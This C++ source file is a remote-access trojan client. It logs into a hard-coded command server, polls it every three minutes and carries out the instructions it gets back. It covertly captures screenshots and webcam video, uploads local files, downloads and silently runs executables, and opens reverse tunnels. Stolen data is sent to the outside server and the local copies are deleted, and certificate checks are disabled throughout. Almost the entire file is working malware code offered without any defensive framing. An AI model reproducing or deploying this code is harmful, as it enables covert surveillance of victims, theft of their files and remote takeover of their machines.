#include <iostream>
#include <fstream>
#include <string>
#include <regex>
#include <chrono>
#include <ctime>
#include <cstdio>
#include <thread>
#include <filesystem>
#include <curl/curl.h>
#include "zlib.h"
#include "ScreenCapture.h"
#include "FileUtils.h" 
#include "ctun.h"
#include "camera.h"

struct CommandInfo {
    std::string command;
    std::string uuid;
    std::string extra;
};


std::string getCurrentDateTime() {
    auto now = std::chrono::system_clock::now();
    std::time_t now_time = std::chrono::system_clock::to_time_t(now);
    std::stringstream ss;
    ss << std::put_time(std::localtime(&now_time), "%Y%m%d%H%M%S");
    return ss.str();
}


size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* output) {
    size_t totalSize = size * nmemb;
    output->append(reinterpret_cast<const char*>(contents), totalSize);
    return totalSize;
}


std::string extractCsrfToken(const std::string& htmlContent) {
    std::regex regexPattern("<input type=\"hidden\" name=\"csrf_token\" value=\"([^\"]*)\">");
    std::smatch match;

    if (std::regex_search(htmlContent, match, regexPattern)) {
        return match[1].str();
    }

    return "";
}

CommandInfo extractCommandInfoFromJson(const std::string& jsonResponse) {
    CommandInfo commandInfo;

    std::regex commandRegex("\"command_executed\":\"([^\"]+)\"");
    std::regex uuidRegex("\"uuid\":\"([a-f0-9-]+)\"");
    std::regex extraRegex("\"extra\":\"([^\"]*)\"");

    std::smatch commandMatch;
    std::smatch uuidMatch;
    std::smatch extraMatch;

    if (std::regex_search(jsonResponse, commandMatch, commandRegex)) {
        commandInfo.command = commandMatch[1].str();
    }

    if (std::regex_search(jsonResponse, uuidMatch, uuidRegex)) {
        commandInfo.uuid = uuidMatch[1].str();
    }

    if (std::regex_search(jsonResponse, extraMatch, extraRegex)) {
        commandInfo.extra = extraMatch[1].str();
    }

    return commandInfo;
}

void performLogout(CURL* curl, const char* logoutUrl, const char* cookies) {
    curl_easy_reset(curl);
    curl_easy_setopt(curl, CURLOPT_URL, logoutUrl);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_REFERER, logoutUrl);
    curl_easy_setopt(curl, CURLOPT_COOKIEFILE, cookies);
    CURLcode res = curl_easy_perform(curl);

    if (res != CURLE_OK) {
        std::cerr << "cURL Error (logout): " << curl_easy_strerror(res) << std::endl;
    } else {
        std::cout << "Logout successful!" << std::endl;
    }
}

void performFileUpload(CURL* curl, const char* uploadUrl, const char* commandsUrl, const char* compressedArchivePath, const CommandInfo& commandInfo, const std::string& csrfToken) {
    // Reset cURL options
    curl_easy_reset(curl);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_URL, uploadUrl);
    curl_easy_setopt(curl, CURLOPT_POST, 1L);
    curl_easy_setopt(curl, CURLOPT_REFERER, commandsUrl);

    // Set up the form data
    struct curl_httppost* post = nullptr;
    struct curl_httppost* last = nullptr;

    curl_formadd(&post, &last, CURLFORM_COPYNAME, "file", CURLFORM_FILE, compressedArchivePath, CURLFORM_END);
    curl_formadd(&post, &last, CURLFORM_COPYNAME, "command", CURLFORM_COPYCONTENTS, commandInfo.command.c_str(), CURLFORM_END);
    curl_formadd(&post, &last, CURLFORM_COPYNAME, "extra", CURLFORM_COPYCONTENTS, commandInfo.extra.c_str(), CURLFORM_END);
    curl_formadd(&post, &last, CURLFORM_COPYNAME, "uuid", CURLFORM_COPYCONTENTS, commandInfo.uuid.c_str(), CURLFORM_END);
    curl_formadd(&post, &last, CURLFORM_COPYNAME, "csrf_token", CURLFORM_COPYCONTENTS, csrfToken.c_str(), CURLFORM_END);

    curl_easy_setopt(curl, CURLOPT_HTTPPOST, post);

    // Perform the file upload
    CURLcode res = curl_easy_perform(curl);

    // Free the form data
    curl_formfree(post);

    if (res != CURLE_OK) {
        std::cerr << "cURL Error (file upload): " << curl_easy_strerror(res) << std::endl;
    } else {
        std::cout << "File uploaded successfully!" << std::endl;

        // Delete the compressed archive
        if (remove(compressedArchivePath) == 0) {
            std::cout << "Compressed archive deleted successfully!" << std::endl;
        } else {
            std::cerr << "Error deleting compressed archive!" << std::endl;
        }
    }
}

bool runInBackground(const char* executablePath) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (CreateProcess(
        NULL,
        const_cast<char*>(executablePath),
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return true; 
    } else {       
        return false; 
    }
}

bool downloadFile(const std::string& url, const std::string& destinationPath) {
    CURL* curl;
    CURLcode res;

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();

    if (curl) {
        FILE* fp = fopen(destinationPath.c_str(), "wb");
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);

        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
        fclose(fp);

        if (res != CURLE_OK) {           
            return false;
        }
        return true;
    }
    return false;
}

int main() {
    const char* loginUrl = "https://16.16.16.114:5000/login";
    const char* commandsUrl = "https://16.16.16.114:5000/get_commands";
    const char* uploadUrl = "https://16.16.16.114:5000/upload";
    
    std::string cookies;

    while (true) {
        CURL* curl = curl_easy_init();
        if (!curl) {
            std::cerr << "cURL initialization failed." << std::endl;
            std::this_thread::sleep_for(std::chrono::minutes(3));
            continue;
        }

        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "");
        curl_easy_setopt(curl, CURLOPT_COOKIEFILE, cookies.c_str());
        
        std::string htmlContent;
        curl_easy_setopt(curl, CURLOPT_URL, loginUrl);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &htmlContent);
        CURLcode res = curl_easy_perform(curl);

        if (res != CURLE_OK) {
            std::cerr << "cURL Error (CSRF token retrieval): " << curl_easy_strerror(res) << std::endl;
            curl_easy_cleanup(curl);
            std::this_thread::sleep_for(std::chrono::minutes(3));
            continue;
        }

        std::string csrfToken = extractCsrfToken(htmlContent);
        if (csrfToken.empty()) {
            std::cerr << "Unable to find CSRF token in HTML response." << std::endl;
            curl_easy_cleanup(curl);
            std::this_thread::sleep_for(std::chrono::minutes(3));
            continue;
        }

        std::cout << "CSRF Token: " << csrfToken << std::endl;
        curl_easy_reset(curl);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        curl_easy_setopt(curl, CURLOPT_URL, loginUrl);
        curl_easy_setopt(curl, CURLOPT_REFERER, loginUrl);
        std::string postFields = "username=client&password=client&secret=client&csrf_token=" + csrfToken;
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postFields.c_str());
        curl_easy_setopt(curl, CURLOPT_COOKIEFILE, cookies.c_str());
        res = curl_easy_perform(curl);

        if (res != CURLE_OK) {
            std::cerr << "cURL Error (login): " << curl_easy_strerror(res) << std::endl;
            curl_easy_cleanup(curl);
            std::this_thread::sleep_for(std::chrono::minutes(3));
            continue;
        }

        curl_easy_reset(curl);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        curl_easy_setopt(curl, CURLOPT_URL, commandsUrl);
        curl_easy_setopt(curl, CURLOPT_REFERER, loginUrl);
        curl_easy_setopt(curl, CURLOPT_COOKIEFILE, cookies.c_str());
        htmlContent.clear();
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &htmlContent);
        res = curl_easy_perform(curl);

        if (res != CURLE_OK) {
            std::cerr << "cURL Error (access to /get_commands): " << curl_easy_strerror(res) << std::endl;
        } else {
            std::cout << "Access to /get_commands successful!" << std::endl;
            std::cout << "Content of /get_commands page: " << std::endl;
            std::cout << htmlContent << std::endl;
        }

        CommandInfo commandInfo = extractCommandInfoFromJson(htmlContent);
        
        if (commandInfo.command == "get_screenshot") {
            std::cout << "Extracted Command: " << commandInfo.command << std::endl;
            std::cout << "Extracted UUID: " << commandInfo.uuid << std::endl;

            ScreenCapture screenCapture;
            screenCapture.CaptureScreensAndSave();
            std::cout << "Screen capture completed!" << std::endl;

            const char* outputArchiveNamePattern = "*.bmp";
            std::string compressedArchivePath = compressFilesInCurrentDirectory(outputArchiveNamePattern);

            deleteFiles("bmp"); 


            std::cout << "Compressed archive path: " << compressedArchivePath << std::endl;

            performFileUpload(curl, uploadUrl, commandsUrl, compressedArchivePath.c_str(), commandInfo, csrfToken);
            
        } else if (commandInfo.command == "get_camera") {
            std::cout << "Extracted Command: " << commandInfo.command << std::endl;
            std::cout << "Extracted UUID: " << commandInfo.uuid << std::endl;

            detectCameras();
            int cameraIndex = 1;  
            std::chrono::seconds duration(10);    

            recordVideo(cameraIndex, duration);
            const char* outputArchiveNamePattern = "*.avi";
            std::string compressedArchivePath = compressFilesInCurrentDirectory(outputArchiveNamePattern);

            deleteFiles("avi"); //

            std::cout << "Compressed archive path: " << compressedArchivePath << std::endl;

            performFileUpload(curl, uploadUrl, commandsUrl, compressedArchivePath.c_str(), commandInfo, csrfToken);

        } else if (commandInfo.command == "download_file") {
            std::cout << "Extracted Command: " << commandInfo.command << std::endl;
            std::cout << "Extracted UUID: " << commandInfo.uuid << std::endl;
            std::string downloadUrl = commandInfo.extra;
            std::string uuid = commandInfo.uuid;
            
            if (downloadUrl.empty()) {
                std::cerr << "Error: Empty download URL." << std::endl;
                return 1; 
            }
            std::string filename = std::filesystem::path(downloadUrl).filename().string();
            std::string destinationPath = "./" + filename;

            if (downloadFile(downloadUrl, destinationPath)) {
                std::cout << "File downloaded successfully to: " << destinationPath << std::endl;
            } else {
                std::cerr << "Error downloading file: " << curl_easy_strerror(res) << std::endl;  
            }

        } else if (commandInfo.command == "upload_file") {
            std::cout << "Extracted Command: " << commandInfo.command << std::endl;
            std::cout << "Extracted UUID: " << commandInfo.uuid << std::endl;
            std::string filePath = commandInfo.extra;
            std::string uuid = commandInfo.uuid;
            std::string compressedArchivePath;
            if (filePath.empty()) {
                std::cerr << "Error: Empty file path." << std::endl;
                return 1; 
            }

            std::string filename = std::filesystem::path(filePath).filename().string();          
            compressedArchivePath = compressFilesInCurrentDirectory(filename.c_str());
     
            if (std::filesystem::exists(compressedArchivePath)) {

                performFileUpload(curl, uploadUrl, commandsUrl, compressedArchivePath.c_str(), commandInfo, csrfToken);
            } else {

            }           
            
        } else if (commandInfo.command == "execute_exe") {
            std::cout << "Extracted Command: " << commandInfo.command << std::endl;
            std::cout << "Extracted UUID: " << commandInfo.uuid << std::endl;
            std::string executablePath;  
            std::string executableFilename = commandInfo.extra;

            if (executableFilename.empty()) { 
                std::cerr << "Error: Empty executable filename." << std::endl;
                return 1; 
            }
     
            if (executableFilename.find('/') == std::string::npos && executableFilename.find('\\') == std::string::npos) {
                executableFilename = "./" + executableFilename;
            }
      
            if (std::filesystem::exists(executableFilename)) {
            
                if (runInBackground(executableFilename.c_str())) {
                    std::cout << "Program " << executablePath << " executed in the background." << std::endl;
                } else {
                    std::cerr << "Error executing " << executablePath << " in the background. Error code: " << GetLastError() << std::endl;
                }
            } else {
                std::cerr << "Error: Executable file does not exist at path: " << executableFilename << std::endl;
            
            }
            
                       
        } else if (commandInfo.command == "rev_tun_port") {
            std::cout << "Executing reverse tunneling..." << std::endl;
            std::regex addressPortRegex("\\(\\s*([^:]+):(\\d+)\\s*\\)\\s*\\(\\s*([^:]+):(\\d+)\\s*\\)");
            

            std::smatch addressPortMatch;

            if (std::regex_search(commandInfo.extra, addressPortMatch, addressPortRegex)) {
                std::string adresseTunnel = addressPortMatch[1].str();
                int portTunnel = std::stoi(addressPortMatch[2].str());

                std::string adresseForward = addressPortMatch[3].str();
                int portForward = std::stoi(addressPortMatch[4].str());

                std::pair<std::string, int> tunnelAddress(adresseTunnel, portTunnel);
                std::pair<std::string, int> forwardAddress(adresseForward, portForward);

                TunnelingClient* tunnelingClient = new TunnelingClient(tunnelAddress, forwardAddress);
                tunnelingClient->startTunneling();
                
                tunnelingClient->closeTunnels();
                delete tunnelingClient;

                
            } else {
                std::cerr << "Invalid 'extra' format for reverse tunneling command." << std::endl;
            }

        } else {
            std::cerr << "Unable to initialize cURL." << std::endl;
        }

        curl_easy_cleanup(curl);
        std::this_thread::sleep_for(std::chrono::minutes(3));
    }

    return 0;
}
